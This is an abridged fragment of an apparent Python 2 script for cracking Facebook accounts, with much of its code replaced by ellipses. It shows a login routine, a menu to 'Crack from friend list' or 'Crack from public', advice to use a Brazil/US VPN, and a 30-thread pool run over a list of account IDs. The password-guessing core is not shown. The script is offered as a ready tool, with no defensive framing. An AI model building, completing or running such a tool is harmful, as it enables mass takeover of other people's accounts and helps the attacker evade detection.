...
def login():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[91m[\xe2\x98\x86] \x1b[92mLOGIN YOUR FACEBOOK ACCOUNT \x1b[91m[\xe2\x98\x86]'
        ...
        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mLooks like your account got a checkpoint'
...
def pilih():
    unikers = raw_input('\n\x1b[00m >>\x1b[92m')
    if unikers == '':
        print '\x1b[00m[!] \x1b[1;9mtrue mission'
        pilih()
    elif unikers == '1':
        super()
    elif unikers == '2':
...
def super():
    ...
    os.system('clear')
    print logo
    print '\x1b[92m1.\x1b[00m Crack from friend list'
    print '\x1b[92m2.\x1b[00m Crack from public'
...
def pilih_super():
    ...
    peak = raw_input('\n\x1b[1;97m >>> \x1b[1;97m')
    if peak == '':
        print '\x1b[00m[!] \x1b[1;91mtrue mission'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            ...
            print '\x1b[00m[!] \x1b[1;91mcorrect content'
            pilih_super()
    ...
    print
    print '\x1b[1;92m[!] \x1b[00mIt faster to use a Brazil/US VPN'
    print 42 * '\x1b[00m-'
    ...
    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[00m[\x1b[00m\xe2\x9c\x93\x1b[00m] \x1b[1;92mDone \x1b[1;97m....'
